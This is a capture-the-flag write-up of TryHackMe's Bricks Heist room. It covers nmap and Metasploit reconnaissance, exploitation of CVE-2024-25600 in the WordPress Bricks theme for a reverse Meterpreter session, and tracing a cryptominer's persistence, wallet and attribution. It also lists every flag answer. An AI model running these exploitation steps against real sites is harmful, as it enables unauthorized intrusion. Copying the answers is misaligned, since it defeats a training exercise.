```markdown
# TryHackMe: Bricks Heist - CTF Write-up

## üìù Overview
**Room:** Bricks Heist (TryHackMe)  
**Difficulty:** Medium  
**Category:** Web Exploitation, Incident Response, Malware Analysis  

In this challenge, we investigate a compromised web server running a vulnerable WordPress theme. After gaining initial access, we transition into an incident response scenario to track down a persistent cryptominer, extract its configuration, and attribute the attack to a known threat group.

---

## üîç Phase 1: Reconnaissance 

We begin by scanning the target to identify active services and potential entry points using Nmap.

```bash
nmap -sC -sV 10.49.155.48

```

**Nmap Scan Results:**

* **Port 22 (SSH):** OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
* **Port 80/443 (HTTP/HTTPS):** Apache web server running WordPress
* **Port 3306 (MySQL):** Unauthorized access

Knowing it's a WordPress site, we launch Metasploit to enumerate the themes and plugins.

```bash
msfconsole
msf6 > use auxiliary/scanner/http/wordpress_scanner
msf6 > set RHOSTS bricks.thm
msf6 > set SSL true
msf6 > set RPORT 443
msf6 > run

```

**Key Discovery:** The scanner detects **WordPress 6.5** running the **Bricks theme version 5.4** and an `administrator` user.

---

## üö™ Phase 2: Exploitation & Initial Access

Researching the Bricks 5.4 theme reveals it is vulnerable to **CVE-2024-25600**, an Unauthenticated Remote Code Execution (RCE) flaw exploiting a "nonce" leakage and the `eval()` function in PHP.

We use Metasploit to exploit this vulnerability:

```bash
msf6 > use exploit/multi/http/wp_bricks_builder_rce
msf6 > set RHOSTS 10.49.155.48
msf6 > set LHOST [Your_Local_IP]
msf6 > set VHOST bricks.thm
msf6 > set SSL true
msf6 > set RPORT 443
msf6 > run

```

This successfully grants us a Meterpreter session on the target box as the `apache` user.

---

## üïµÔ∏è Phase 3: Post-Exploitation & Investigation

With our foothold established, we navigate the file system to answer the room's investigation questions.

### Question 1: What is the content of the hidden .txt file in the web folder?

While exploring the web directory (`/data/www/default`), we locate a text file with a suspicious MD5 hash as its name. We read the contents using the `cat` command:

```bash
meterpreter > cat 650c844110baced87e1606453b93f22a.txt

```

* **Answer:** `THM{fl46_650c844110baced87e1606453b93f22a}`

*(Note: We also audited `wp-config.php` during this step and uncovered the database credentials `root:lamp.sh`).*

### Question 2: What is the name of the suspicious process?

The server shows signs of a potential cryptominer. We check the running processes to find the culprit running as root:

```bash
meterpreter > ps

```

We spot a highly suspicious process running out of the NetworkManager directory:
`2796  /lib/NetworkManager/nm-inet-dialog  root`

* **Answer:** `nm-inet-dialog`

### Question 3: What is the service name affiliated with the suspicious process?

Attackers often use systemd services to maintain persistence. We inspect the `/etc/systemd/system/` directory and find a service explicitly executing our suspicious binary.

```bash
meterpreter > cat /etc/systemd/system/ubuntu.service

```

The `ExecStart` parameter points directly to `/lib/NetworkManager/nm-inet-dialog`.

* **Answer:** `ubuntu.service`

### Question 4: What is the log file name of the miner instance?

To understand the malware's behavior, we analyze its configuration rules located in `/etc/badr/room.rules.yaml`. The rules reveal that the miner is masquerading its logs as a standard network configuration file.

* **Answer:** `inet.conf`

### Question 5: What is the wallet address of the miner instance?

We navigate to the directory hosting the suspicious process to look for its configuration or log outputs. We find and read the `inet.conf` file:

```bash
meterpreter > cat /lib/NetworkManager/inet.conf

```

This outputs a long hex-encoded ID string:
`ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d`

We extract it and decode it locally on our machine using a double-decode method (Hex ‚ûî Base64 ‚ûî Plaintext):

```bash
echo "5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d" | xxd -r -p | base64 -d | base64 -d

```

This reveals the attacker's Bitcoin SegWit address.

* **Answer:** `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`

### Question 6: The wallet address used has been involved in transactions between wallets belonging to which threat group?

We cross-reference the extracted Bitcoin wallet address using Open-Source Intelligence (OSINT) and Threat Intelligence databases. The address is a known Indicator of Compromise (IoC) linked to a major ransomware operation.

* **Answer:** `LockBit`

---

## üèÅ Final Summary Table

| TryHackMe Prompt | Verified Answer |
| --- | --- |
| **Content of the hidden .txt file** | `THM{fl46_650c844110baced87e1606453b93f22a}` |
| **Name of the suspicious process** | `nm-inet-dialog` |
| **Service name affiliated with process** | `ubuntu.service` |
| **Log file name of the miner** | `inet.conf` |
| **Wallet address of the miner** | `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa` |
| **Threat Group affiliation** | `LockBit` |
